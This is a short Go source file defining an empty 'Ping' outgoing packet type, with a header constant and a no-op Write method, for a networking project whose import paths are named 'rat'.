package outgoing

import (
	"rat/common"
	"rat/command/networking"
)

const PingHeader common.PacketHeader = 0

type Ping struct {
	Packet
}

func (packet Ping) GetHeader() common.PacketHeader {
	return PingHeader
}

func (packet Ping) Write(c *networking.Client) error {
	return nil
}
